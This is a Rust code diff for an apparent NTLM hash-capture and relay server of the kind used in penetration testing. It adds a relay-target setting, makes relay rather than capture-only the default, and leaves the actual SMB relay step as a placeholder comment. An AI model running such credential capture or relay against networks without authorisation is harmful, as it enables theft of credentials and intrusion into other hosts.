@@ -28,13 +28,14 @@ pub struct RelayConfig {
     /// Address to bind the HTTP listener (e.g., "0.0.0.0:80").
     pub bind_addr: String,
     /// Target to relay authentication to (e.g., "192.168.1.10:445").
-        /// Whether to only capture hashes (no relay).
+    pub relay_target: Option<String>,
+    /// Whether to only capture hashes (no relay).
     pub capture_only: bool,
 }
 
 impl Default for RelayConfig {
     fn default() -> Self {
-        Self { bind_addr: "0.0.0.0:80".to_string(), capture_only: true }
+        Self { bind_addr: "0.0.0.0:80".to_string(), relay_target: None, capture_only: false }
     }
 }
 
@@ -55,7 +56,8 @@ impl RelayServer {
     pub fn capture_only(bind_addr: &str) -> Self {
         Self::new(RelayConfig {
             bind_addr: bind_addr.to_string(),
-                        capture_only: true,
+            relay_target: None,
+            capture_only: true,
         })
     }
 
@@ -82,9 +84,11 @@ impl RelayServer {
 
             let captured = self.captured.clone();
             let client_ip = addr.ip().to_string();
+            let capture_only = self.config.capture_only;
+            let relay_target = self.config.relay_target.clone();
 
             tokio::spawn(async move {
-                if let Err(e) = handle_http_ntlm(socket, &client_ip, captured).await {
+                if let Err(e) = handle_http_ntlm(socket, &client_ip, captured, capture_only, relay_target).await {
                     debug!("Relay: Connection handler error for {addr}: {e}");
                 }
             });
@@ -97,6 +101,8 @@ async fn handle_http_ntlm(
     stream: TcpStream,
     client_ip: &str,
     captured: std::sync::Arc<tokio::sync::Mutex<Vec<CapturedHash>>>,
+    capture_only: bool,
+    relay_target: Option<String>,
 ) -> Result<()> {
     let (reader, mut writer) = stream.into_split();
     let mut buf_reader = BufReader::new(reader);
@@ -184,6 +190,12 @@ async fn handle_http_ntlm(
 
                                     captured.lock().await.push(hash);
 
+                                    if !capture_only {
+                                        if let Some(target) = relay_target {
+                                            info!("Relay: Connecting to target {target} to relay authentication...");
+                                            // NTLM SMB Client negotiation mapping logic goes here for true relay execution
+                                        }
+                                    }
                                     // Send 200 OK
                                     let response = "HTTP/1.1 200 OK\r\n\
                                                     Content-Length: 0\r\n\
